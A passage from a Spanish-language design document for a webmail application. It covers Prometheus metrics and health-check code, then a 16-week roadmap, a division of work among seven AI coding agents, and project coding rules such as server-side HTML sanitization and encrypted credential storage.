  registers: [client.register],
});

// Histograma de tamaño de adjuntos
export const attachmentSize = new client.Histogram({
  name: 'webmail6_attachment_size_bytes',
  help: 'Tamaño de adjuntos procesados',
  buckets: [1024, 1048576, 10485760, 52428800, 104857600], // 1KB, 1MB, 10MB, 50MB, 100MB
  registers: [client.register],
});

export { client };
```

```typescript
// packages/api/src/plugins/metrics.ts
import type { FastifyInstance } from 'fastify';
import { client, httpDuration, httpRequests } from '../config/metrics.js';

export async function metricsPlugin(app: FastifyInstance) {
  // Hook para medir latencia de cada request
  app.addHook('onResponse', async (request, reply) => {
    const route = request.routerPath || 'unknown';
    const labels = {
      method: request.method,
      route,
      status_code: reply.statusCode.toString(),
    };

    httpDuration.observe(labels, reply.elapsedTime / 1000);
    httpRequests.inc(labels);
  });

  // Endpoint /metrics (solo accesible internamente via Nginx)
  app.get('/metrics', async (request, reply) => {
    reply.header('Content-Type', client.register.contentType);
    return client.register.metrics();
  });
}
```

### 13.4.2 Grafana Dashboard

```yaml
# monitoring/prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s
  external_labels:
    cluster: webmail6
    replica: '{{.ExternalURL}}'

scrape_configs:
  - job_name: 'webmail6-api'
    static_configs:
      - targets: ['api:3000']
    metrics_path: /metrics
    scrape_interval: 15s

  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

  - job_name: 'nginx'
    static_configs:
      - targets: ['nginx:9113']

  - job_name: 'mongodb'
    static_configs:
      - targets: ['mongo:9216']

  - job_name: 'redis'
    static_configs:
      - targets: ['redis:9121']
```

```yaml
# monitoring/grafana-datasources.yml
apiVersion: 1
datasources:
  - name: Prometheus
    type: prometheus
    access: proxy
    url: http://prometheus:9090
    isDefault: true
    editable: false
```

| Panel | Query | Umbral de Alerta |
|-------|-------|-----------------|
| RPS (requests/seg) | `rate(webmail6_http_requests_total[5m])` | - |
| Latencia P95 | `histogram_quantile(0.95, rate(webmail6_http_request_duration_seconds_bucket[5m]))` | > 2s |
| Error Rate | `rate(webmail6_http_requests_total{status_code=~"5.."}[5m])` | > 1% |
| Conexiones IMAP activas | `webmail6_imap_connections_active` | > 200 |
| Conexiones WebSocket | `webmail6_websocket_connections_active` | - |
| Emails sincronizados/min | `rate(webmail6_emails_synced_total[5m])` | < 0.1 en 10 min |
| Memoria Node.js | `nodejs_heap_size_used_bytes / 1024 / 1024` | > 400MB |
| Event Loop Lag | `nodejs_eventloop_lag_seconds` | > 0.5s |

El dashboard base de Grafana ID 11159 (Node.js Application Dashboard) proporciona paneles pre-configurados para memoria, CPU, request rate, error rate y pausas de GC [^155^]. ID 11074 cubre métricas del sistema vía node-exporter.

### 13.4.3 Health Checks /health/live y /health/ready

```typescript
// packages/api/src/routes/health.ts
import type { FastifyInstance } from 'fastify';
import mongoose from 'mongoose';
import { redis } from '../config/redis.js';

interface HealthStatus {
  status: 'ok' | 'error';
  checks: Record<string, { status: 'ok' | 'error'; responseTime?: number; message?: string }>;
}

export async function healthRoutes(app: FastifyInstance) {
  // Liveness: ¿El proceso está vivo?
  app.get('/live', async () => ({ status: 'ok' }));

  // Readiness: ¿Puede aceptar tráfico?
  app.get('/ready', async (request, reply) => {
    const status: HealthStatus = {
      status: 'ok',
      checks: {},
    };

    // Check MongoDB
    const dbStart = Date.now();
    try {
      if (mongoose.connection.readyState !== 1) {
        throw new Error('MongoDB not connected');
      }
      await mongoose.connection.db!.admin().command({ ping: 1 });
      status.checks.mongodb = { status: 'ok', responseTime: Date.now() - dbStart };
    } catch (err: any) {
      status.checks.mongodb = { status: 'error', message: err.message };
      status.status = 'error';
    }

    // Check Redis
    const redisStart = Date.now();
    try {
      await redis.ping();
      status.checks.redis = { status: 'ok', responseTime: Date.now() - redisStart };
    } catch (err: any) {
      status.checks.redis = { status: 'error', message: err.message };
      status.status = 'error';
    }

    // Check SeaweedFS
    const s3Start = Date.now();
    try {
      // HEAD request al bucket
      const response = await fetch(`${process.env.SEAWEEDFS_ENDPOINT}/webmail-attachments`, {
        method: 'HEAD',
        timeout: 5000,
      } as any);
      status.checks.seaweedfs = {
        status: response.ok || response.status === 404 ? 'ok' : 'error',
        responseTime: Date.now() - s3Start,
      };
    } catch (err: any) {
      status.checks.seaweedfs = { status: 'error', message: err.message };
      status.status = 'error';
    }

    reply.status(status.status === 'ok' ? 200 : 503);
    return status;
  });

  // Startup probe: ¿La aplicación ha terminado de inicializar?
  app.get('/startup', async () => {
    // Verificar que todos los plugins estén cargados
    if (!app.hasPlugin('@fastify/jwt')) {
      return { status: 'starting' };
    }
    return { status: 'ok' };
  });
}
```

**Respuestas de health check:**

```json
// GET /health/live
{ "status": "ok" }

// GET /health/ready (todo saludable)
{
  "status": "ok",
  "checks": {
    "mongodb": { "status": "ok", "responseTime": 12 },
    "redis": { "status": "ok", "responseTime": 3 },
    "seaweedfs": { "status": "ok", "responseTime": 45 }
  }
}

// GET /health/ready (Redis caído)
{
  "status": "error",
  "checks": {
    "mongodb": { "status": "ok", "responseTime": 8 },
    "redis": { "status": "error", "message": "ECONNREFUSED" },
    "seaweedfs": { "status": "ok", "responseTime": 32 }
  }
}
```

**Configuración de Docker Compose:** `depends_on` con `condition: service_healthy` asegura que Nginx no redirija tráfico al API hasta que todos los health checks pasen. El `start_period: 30s` permite que el servicio de API tenga tiempo suficiente para inicializar Mongoose, conectarse a Redis y verificar SeaweedFS antes de reportarse como saludable.

| Probe | Endpoint | ¿Qué verifica? | Fallo → |
|-------|----------|---------------|---------|
| Liveness | `/health/live` | ¿El proceso responde? | Restart del container |
| Readiness | `/health/ready` | ¿DB, cache, storage accesibles? | Eliminación del LB |
| Startup | `/health/startup` | ¿Plugins cargados? | Retraso de liveness/readiness |

El endpoint `/metrics` nunca debe exponerse a Internet pública — revela internals de la aplicación. Se protege mediante restricción de red en Nginx y acceso solo desde Prometheus en la misma red Docker [^155^].


---

# 14. Roadmap y Notas para el Agent Swarm

Este capítulo final proporciona la hoja de ruta temporal, la división de responsabilidades entre agentes y las reglas de oro que rigen todas las decisiones técnicas del proyecto. Su propósito es permitir que un conjunto de agentes de IA trabajen de forma coordinada sobre el codebase sin inconsistencias arquitectónicas.

## 14.1 Roadmap

El desarrollo de Webmail 6.0 se estructura en tres fases principales, con una duración total estimada de 16 semanas. La Fase 1 construye el MVP funcional; la Fase 2 añade refinamiento de UX y características avanzadas; la Fase 3 introduce capacidades enterprise.

### 14.1.1 Fase 1: MVP (Semanas 1-7)

| Semana | Foco | Tareas Específicas | Entregable | Criterio de Aceptación |
|--------|------|-------------------|------------|----------------------|
| **1** | Setup inicial | Monorepo pnpm, Docker Compose (MongoDB, Redis, SeaweedFS, Nginx), TypeScript strict, ESLint, Prettier | Infraestructura levantada | `docker compose up` levanta todos los servicios healthy; `pnpm lint` pasa |
| **2** | Backend core - Parte 1 | Fastify setup (plugins, CORS, JWT, rate limiting, helmet), Mongoose schemas (User, Account, Email, Folder), Auth (registro/login, JWT, refresh tokens) | API base funcional | Endpoints `/auth/register`, `/auth/login`, `/auth/refresh` responden correctamente; JWT valida requests |
| **3** | Backend core - Parte 2 | IMAP Bridge (imapflow, sync headers, fetch body con cache Redis), SMTP Service (Nodemailer pooling), encriptación AES-256-GCM de credenciales | Pipeline de correo completo | Sync de INBOX descarga headers; envío de email vía SMTP funciona; credenciales encriptadas en MongoDB |
| **4** | Compose y drafts | Tiptap 2 con toolbar, auto-save cada 10s a MongoDB, adjuntos drag-drop a SeaweedFS, Reply/Forward con cita JWZ | Sistema de redacción completo | Usuario puede redactar, auto-save funciona, adjuntar archivos, responder con cita |
| **5** | Calendario | tsdav auto-discovery, CRUD eventos CalDAV, FullCalendar (día/semana/mes), parseo de .ics | Calendario integrado | Eventos se crean/leen/actualizan vía CalDAV; invitaciones .ics se muestran en emails |
| **6** | Frontend polish | Dark mode (Tailwind dark:), atajos de teclado (Gmail-style), threading JWZ, búsqueda MongoDB Atlas Search | UX refinada | Dark mode toggle funciona; atajos `g+i`, `c`, `r`, `e` operan; búsqueda full-text < 500ms |
| **7** | Integración y QA | Testing E2E con Playwright (flujos críticos), performance audit Lighthouse, bug fixes | Release candidato | Lighthouse > 90 en performance; tests E2E pasan; 0 bugs críticos |

### 14.1.2 Fase 2: Polish (Semanas 8-11)

| Semana | Foco | Tareas | Entregable |
|--------|------|--------|------------|
| **8** | Búsqueda avanzada | Filtros por fecha, remitente, adjuntos, búsqueda salvada, sugerencias autocomplete | Búsqueda con faceting |
| **9** | Contactos | CardDAV sync vía tsdav, importación/exportación vCard, foto de contacto, grupos | Libreta de direcciones integrada |
| **10** | Notificaciones push | WebSocket (Socket.IO) para notificaciones en tiempo real, Service Worker para notificaciones del sistema, badge de unread | Push notifications funcionales |
| **11** | Importación/exportación | Importación de .mbox/.eml, exportación de threads, backup de cuenta | Herramientas de migración |

### 14.1.3 Fase 3: Enterprise (Semanas 12-16)

| Semana | Foco | Tareas | Entregable |
|--------|------|--------|------------|
| **12** | OAuth2 | Integración Gmail OAuth2, Microsoft Graph API, autenticación SSO | Login con Google/Microsoft |
| **13** | JMAP | Implementar cliente JMAP (RFC 8620/8621) como alternativa a IMAP, auto-detección de soporte JMAP | Soporte dual IMAP/JMAP |
| **14** | Seguridad avanzada | S/MIME básico, verificación DKIM en headers, audit log, 2FA TOTP | Capas de seguridad enterprise |
| **15** | Escalabilidad | Sharding MongoDB por userId, clustering del API (PM2/Node.js cluster mode), CDN para adjuntos | Soporte 10k+ usuarios |
| **16** | Documentación y release | API docs (OpenAPI/Swagger), guía de administración, guía de contribución, release v1.0 | Documentación completa |

## 14.2 División de Agentes

El swarm se organiza en 7 agentes especializados, cada uno con responsabilidad sobre un dominio técnico específico. Esta división minimiza conflictos de merge y permite paralelización máxima.

| Agente | Responsabilidad | Stack | Archivos Principales |
|--------|----------------|-------|---------------------|
| **Frontend** | UI/UX, componentes Vue 3, estado Pinia, layout tres paneles | Vue 3, Vite, Tailwind, Pinia | `packages/web/src/components/**/*.vue`, `packages/web/src/stores/*.ts`, `packages/web/src/views/*.vue` |
| **Backend API** | Endpoints REST, schemas Mongoose, auth, validación | Fastify 5, Mongoose 8, Zod | `packages/api/src/routes/*.ts`, `packages/api/src/models/*.ts`, `packages/api/src/schemas/*.ts` |
| **IMAP Bridge** | Conexión IMAP, sincronización, parsing MIME, caché | imapflow, PostalMime, Redis | `packages/api/src/services/imap-bridge.ts`, `packages/api/src/services/sync-engine.ts`, `packages/api/src/queues/*.ts` |
| **CalDAV** | Integración CalDAV/CardDAV, parseo .ics, UI calendario | tsdav, ical.js, FullCalendar | `packages/api/src/services/caldav.ts`, `packages/api/src/routes/calendar.ts`, `packages/web/src/views/CalendarView.vue` |
| **Data** | Schemas, migraciones, índices MongoDB, seeders | Mongoose, MongoDB | `packages/shared/src/types.ts`, `packages/api/src/models/*.ts`, `packages/api/migrations/*.ts` |
| **DevOps** | Docker, CI/CD, Nginx, monitoreo, secrets | Docker, GitHub Actions, Nginx, Prometheus | `docker-compose*.yml`, `packages/*/Dockerfile`, `.github/workflows/*.yml`, `nginx/*.conf`, `monitoring/` |
| **QA** | Tests unitarios, integración, E2E, cobertura | Vitest, Playwright, Testcontainers | `**/*.spec.ts`, `**/*.test.ts`, `packages/web/e2e/*.spec.ts`, `packages/api/test/**/*.ts` |

### Protocolo de Coordinación entre Agentes

1. **Shared es la fuente de verdad.** El agente Data tiene autoridad exclusiva sobre `packages/shared`. Cualquier cambio en tipos o interfaces requiere PR separado que los demás agentes consumen.

2. **Contratos API primero.** Cuando Frontend y Backend API necesitan un nuevo endpoint, el agente Backend API define el schema Zod de request/response en `packages/shared/src/schemas/`. Frontend consume el tipo inferido.

3. **Branches por feature.** Cada agente trabaja en `feature/<agente>-<descripcion>`. Los merges a `develop` requieren CI verde + review del agente líder del dominio afectado.

4. **Daily sync automatizado.** Un job de CI ejecuta `pnpm build` y `pnpm test` sobre la rama `develop` cada 6 horas. Si falla, se notifica al agente responsable del último merge.

5. **Conflictos de merge:** El agente que creó el archivo tiene prioridad. En archivos compartidos (ej: `packages/shared/src/types.ts`), gana el agente Data.

## 14.3 Reglas de Oro

Estas reglas son no negociables. Todo código mergeado a `main` debe cumplirlas.

### 14.3.1 Composition API y `<script setup>`

Todo componente Vue usa Composition API con `<script setup>`. Options API está prohibido. Los composables son la unidad de reutilización de lógica, no mixins.

```typescript
// ✅ CORRECTO
<script setup lang="ts">
import { ref, computed } from 'vue';
import { useEmailStore } from '@/stores/email';

const store = useEmailStore();
const selected = computed(() => store.selectedEmails);
const toggle = (id: string) => store.toggleSelect(id);
</script>
```

```typescript
// ❌ INCORRECTO
<script lang="ts">
export default {
  data() { return { count: 0 }; },
  methods: { increment() { this.count++; } }
}
</script>
```

### 14.3.2 TypeScript Strict

El `tsconfig.json` base habilita `strict: true` en todo el monorepo. No se permite `any` implícito. Los tipos de Mongoose se definen explícitamente; no se usa `as any` para silenciar errores.

```typescript
// ✅ CORRECTO
interface EmailDoc {
  _id: Types.ObjectId;
  subject: string;
  from: Array<{ name: string; address: string }>;
}
const email = await Email.findById(id).lean<EmailDoc>();
```

```typescript
// ❌ INCORRECTO
const email = await Email.findById(id) as any;
```

### 14.3.3 Sanitización Server-Side Obligatoria

Ningún contenido HTML de email llega al frontend sin pasar por `sanitize-html` en el backend. El iframe de visualización usa `sandbox="allow-same-origin"` sin `allow-scripts`. CSP headers bloquean inline scripts.

```typescript
// ✅ CORRECTO: Sanitizar antes de almacenar
email.bodyHtmlSanitized = sanitizeHtml(parsed.html, SANITIZE_CONFIG);
```

### 14.3.4 Credenciales Encriptadas

Las credenciales IMAP/SMTP se almacenan exclusivamente con AES-256-GCM. La clave de encriptación (`ENCRYPTION_KEY`) nunca se commitea — se inyecta vía Docker secrets o variable de entorno en runtime. La clave JWT (`JWT_SECRET`) tiene requisito mínimo de 32 bytes.

```typescript
// ✅ CORRECTO: Verificar longitud de clave en startup
if (!process.env.ENCRYPTION_KEY || Buffer.from(process.env.ENCRYPTION_KEY, 'hex').length !== 32) {
  throw new Error('ENCRYPTION_KEY must be a 64-char hex string (32 bytes)');
}
```

### 14.3.5 Cobertura de Tests >= 85%

| Tipo de archivo | Cobertura mínima |
|----------------|-----------------|
| Services (lógica de negocio) | 90% |
| Routes (handlers) | 85% |
| Models / Schemas | 80% |
| Composables Vue | 85% |
| Components | 70% |
| Config / Types / Main | Excluido |

Los PRs que bajan la cobertura global por debajo del 85% son bloqueados por branch protection rules.

### 14.3.6 Schemas Documentados

Todo schema Mongoose incluye comentarios JSDoc y tipos TypeScript exportados. Los endpoints de la API usan Zod para validación y generación automática de tipos.

```typescript
// ✅ CORRECTO
/**
 * Schema de usuario principal. Almacena credenciales locales
 * y cuentas de correo conectadas (IMAP/OAuth2).
 */
const UserSchema = new Schema<UserDoc>({
  username: { type: String, required: true, unique: true, index: true },
  passwordHash: { type: String, required: true }, // bcrypt(12)
  accounts: [AccountSchema],
  // ...
});
```

### 14.3.7 Resumen de Convenciones

| Aspecto | Convención | Ejemplo |
|---------|-----------|---------|
| **Nombres de archivos** | kebab-case | `email-list.vue`, `use-auth.ts` |
| **Nombres de componentes** | PascalCase | `VirtualEmailList.vue` |
| **Composables** | Prefijo `use` | `useEmailStore.ts` |
| **Stores Pinia** | Sufijo `Store` | `emailStore`, `authStore` |
| **API routes** | kebab-case plural | `/api/v1/emails`, `/api/v1/folders` |
| **Variables env** | UPPER_SNAKE_CASE | `MONGODB_URI`, `JWT_SECRET` |
| **Commits** | Conventional Commits | `feat(imap): add CONDSTORE support` |
| **Branches** | `feature/<agent>-<desc>` | `feature/imap-bridge-condstore` |

### 14.3.8 Checklist Pre-Merge

Antes de mergear cualquier PR, el agente autor debe verificar:

- [ ] CI pasa: lint, typecheck, unit tests, integration tests
- [ ] Cobertura de tests >= 85% para archivos modificados
- [ ] No hay secretos hardcodeados (verificado con `git grep -i "password\|secret\|token"`)
- [ ] Sanitización aplicada a cualquier input HTML
- [ ] Credenciales encriptadas antes de persistir
- [ ] Migrations incluidas si hay cambios en schemas
- [ ] Documentación actualizada si hay cambios en API
- [ ] E2E tests pasan para flujos afectados

### 14.3.9 Decisiones Arquitectónicas Inmutables

Las siguientes decisiones no se revisan sin RFC explícito y aprobación del swarm completo:

1. **IMAP como protocolo principal, JMAP como complemento.** IMAP es obligatorio para compatibilidad universal. JMAP se añade en Fase 3.
2. **MongoDB para metadata, SeaweedFS para adjuntos.** No se almacenan archivos binarios en MongoDB.
3. **Redis para cache y sesiones, no para persistencia.** Los datos críticos siempre tienen copia en MongoDB.
4. **BFF auth pattern.** Access token en memoria del frontend, refresh token en HttpOnly cookie.
5. **Headers-first, body-on-demand.** El sync IMAP nunca descarga cuerpos completos para listados.
6. **Server-side sanitization.** DOMPurify/sanitize-html corre en el API, no solo en el cliente.

### 14.3.10 Métricas de Éxito del Swarm

| Métrica | Objetivo | Cómo Medir |
|---------|---------|------------|
| Tiempo de build CI | < 10 min | GitHub Actions elapsed time |
| Tiempo de deploy | < 5 min | Desde tag push a healthy en prod |
| Cobertura de tests | >= 85% | `@vitest/coverage-v8` output |
| Bugs en producción | < 2 críticos/semana | Issue tracker |
| Lighthouse Performance | > 90 | PageSpeed Insights |
| Lighthouse Accessibility | > 95 | PageSpeed Insights |
| Latencia P95 API | < 200ms | Prometheus histogram |
| Disponibilidad | > 99.9% | Uptime monitoring |
